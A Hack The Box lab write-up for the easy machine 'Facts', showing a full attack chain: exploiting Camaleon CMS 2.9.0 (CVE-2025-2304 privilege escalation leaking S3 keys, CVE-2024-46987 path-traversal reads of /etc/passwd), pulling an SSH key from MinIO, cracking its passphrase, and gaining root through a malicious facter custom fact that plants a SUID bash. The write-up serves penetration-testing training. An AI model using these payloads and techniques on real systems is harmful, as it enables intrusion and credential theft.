# Machine: Facts
 
Date: 24-05-2026
Platform: Hack The Box
Difficulty: Easy
Author: atrix187
 
---
 
## Topics Covered
 
Web Enumeration, CMS Exploitation, LFI, AWS S3, SSH Key Cracking, Privilege Escalation via Facter (Ruby)
 
---
 
## Vulnerabilities Exploited
 
- **CVE-2025-2304** — Camaleon CMS Authenticated Privilege Escalation + AWS Credential Leak
- **CVE-2024-46987** — Camaleon CMS Local File Inclusion (LFI) via Media Download
---
 
## Recon
 
### Nmap
 
```bash
nmap -sC -sV 10.129.X.X
```
 
**Results:**
 
- Port 22 → OpenSSH 9.9p1 (Ubuntu)
- Port 80 → nginx 1.26.3 (Ubuntu)
**Notes:**
 
- HTTP response reveals the site refers to itself as `facts.htb`.
- Added to `/etc/hosts`:
```bash
echo "10.129.X.X facts.htb" | sudo tee -a /etc/hosts
```
 
---
 
## Enumeration
 
### Directory Brute-Force
 
```bash
feroxbuster -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
 
**Findings:**
 
- `http://facts.htb/admin` → 302 redirect to login page — hidden admin panel exists
### Application Fingerprinting
 
- `http://facts.htb` → trivia/facts website, nothing notable on the surface
- `http://facts.htb/admin` → Camaleon CMS **v2.9.0** — open registration enabled
Registered a test account:
 
```
Username: testuser
Password: test123
```
 
Logged in and confirmed CMS version from the admin panel.
 
---
 
## Exploitation
 
### CVE-2025-2304 — Camaleon CMS Privilege Escalation + AWS Credential Leak
 
Camaleon CMS 2.9.0 allows an authenticated regular user to escalate to admin and extract AWS S3 credentials stored in the application config.
 
**Steps:**
 
**1. Clone and run the public PoC:**
 
```bash
sudo python3 payload.py -u http://facts.htb -U testuser -P test --newpass test -e -r
```
 
Flags: `-u` target URL, `-U/-P` credentials, `--newpass` replacement password, `-e` extract creds, `-r` revert role after
 
**Result:**
 
```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
User ID: 5
Current User Role: admin
[+] Extracting S3 Credentials
s3 access key: AKIA8BC4B3F3AD6ACDE8
s3 secret key: Ypl3Qk9I2LmYEMv5VjT9WDttY+aRnHSY8U57I4Nz
s3 endpoint:   http://localhost:54321
[+] Reverting User Role
User ID: 5
User Role: admin
```
 
---
 
### CVE-2024-46987 — LFI via Media File Download
 
Camaleon CMS 2.9.0 is also vulnerable to Local File Inclusion in the media file download endpoint. The `file` parameter is not sanitized, allowing path traversal to read arbitrary system files.
 
**Vulnerable endpoint:**
 
```
GET /admin/media/download_private_file?file=somefile.png
```
 
**Steps:**
 
**1. Intercept the request in Burp Suite and modify the `file` parameter:**
 
```
GET /admin/media/download_private_file?file=../../../../../etc/passwd
```
 
Each `../` moves one directory up. Five levels up from the web app's working directory lands at filesystem root `/`.
 
**Result — interesting users in `/etc/passwd`:**
 
```
william:x:1001:1001::/home/william:/bin/bash
trivia:x:1000:1000::/home/trivia:/bin/bash
```
 
**2. Read the user flag directly:**
 
```
GET /admin/media/download_private_file?file=../../../../../home/william/user.txt
```
 
```
User Flag: 17279e4c5b001d5072fbf5c0d5cee4f7
```
 
---
 
### AWS S3 — SSH Key Extraction
 
Using the credentials from CVE-2025-2304 to explore the local S3-compatible service (MinIO) running on port 54321.
 
**1. Set credentials as environment variables:**
 
```bash
export AWS_ACCESS_KEY_ID=AKIA8BC4B3F3AD6ACDE8
export AWS_SECRET_ACCESS_KEY=Ypl3Qk9I2LmYEMv5VjT9WDttY+aRnHSY8U57I4Nz
export AWS_DEFAULT_REGION=us-east-1
```
 
**2. List buckets:**
 
```bash
aws s3 ls --endpoint-url http://facts.htb:54321
```
 
```
2025-09-11 internal
2025-09-11 randomfacts
```
 
**3. Explore the `internal` bucket:**
 
```bash
aws s3 ls s3://internal --endpoint-url http://facts.htb:54321
```
 
```
PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .lesshst
    .profile
```
 
**4. Check `.ssh/`:**
 
```bash
aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
```
 
```
authorized_keys
id_ed25519
```
 
**5. Download the private key:**
 
```bash
aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --endpoint-url http://facts.htb:54321
chmod 600 id_ed25519
```
 
---
 
### SSH Key Passphrase Cracking
 
```bash
ssh -i id_ed25519 trivia@facts.htb
# prompted for passphrase
```
 
**1. Convert key to crackable hash:**
 
```bash
ssh2john id_ed25519 > key.hash
```
 
**2. Crack with John:**
 
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```
 
```
dragonballz    (id_ed25519)
```
 
**3. SSH in as `trivia`:**
 
```bash
ssh -i id_ed25519 trivia@facts.htb
# passphrase: dragonballz
```
 
**Result:** Shell as `trivia`.
 
---
 
## Privilege Escalation
 
### Facter Custom Fact — Ruby Code Execution as Root
 
```bash
sudo -l
```
 
```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
 
`facter` is a Ruby-based system facts tool from the Puppet ecosystem. It supports custom facts — Ruby scripts it loads and executes on collection. Since it runs as root here and loads `.rb` files from a directory controlled by `FACTERLIB`, arbitrary Ruby (and therefore arbitrary shell commands) run as root.
 
**Steps:**
 
**1. Write a malicious custom fact to `/tmp/exploit.rb`:**
 
```bash
echo 'Facter.add(:exploit) { setcode { system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash") } }' > /tmp/exploit.rb
```
 
Expanded:
 
```ruby
Facter.add(:exploit) do
  setcode do
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
  end
end
```
 
This copies `/bin/bash` to `/tmp/rootbash` and sets the SUID bit on it. When executed, `rootbash` runs with root permissions regardless of who launches it.
 
**2. Run facter as root, pointing it at `/tmp`:**
 
```bash
sudo FACTERLIB=/tmp facter exploit
```
 
`FACTERLIB=/tmp` tells facter to load custom `.rb` files from `/tmp`. It finds `exploit.rb`, executes the Ruby block as root, and creates `/tmp/rootbash` with SUID set.
 
**3. Spawn root shell:**
 
```bash
/tmp/rootbash -p
```
 
The `-p` flag preserves the elevated SUID permissions — without it, bash drops them by default.
 
**Result:** Root shell (`#` prompt).
 
---
 
## Loot / Flags
 
- **user.txt:** `17279e4c5b001d5072fbf5c0d5cee4f7` → `/home/william/user.txt` (via LFI)
- **root.txt:** `0201aac03c786e1a6740458ee8819116` → `/root/root.txt`
---
 
## Lessons Learned
 
- Always try default credentials before anything else — `admin:admin` on a CMS login saves a lot of time.
- CMS version disclosure is a direct path to CVE lookup. If the admin panel shows the version, search it immediately.
- LFI via path traversal can shortcut the entire foothold phase — if you can read arbitrary files, check `/etc/passwd`, home directories, and SSH keys before spending time on other attack paths.
- S3-compatible local services (MinIO) behave identically to real AWS S3. The `--endpoint-url` flag is all you need to redirect the AWS CLI to a local instance.
- `sudo -l` should always be the first privesc check after getting a shell. A single NOPASSWD entry on a Ruby-capable tool like facter is a direct root path.
- SUID bash requires `-p` to retain elevated privileges — bash intentionally drops SUID on launch unless you explicitly tell it not to.
